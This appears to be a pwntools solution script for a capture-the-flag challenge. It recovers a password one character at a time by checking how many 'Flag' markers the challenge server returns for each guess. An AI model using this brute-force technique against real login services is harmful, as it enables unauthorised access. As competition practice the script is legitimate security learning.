from pwn import *
from string import printable

# p = remote("chal.pctf.competitivecyber.club", 4757)
context.log_level = "critical"
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
payload1 = ""

for j in range(19):
    for i in printable:
        p = remote("chal.pctf.competitivecyber.club", 4757)
        payload = payload1.ljust(19, i)
        sla(b"password: ", payload)
        res = p.recvuntil(b"error")
        if len(payload1) != res.count(b"Flag"):
            payload1 += i
            print(payload1)
            break
        p.close()

p.interactive()
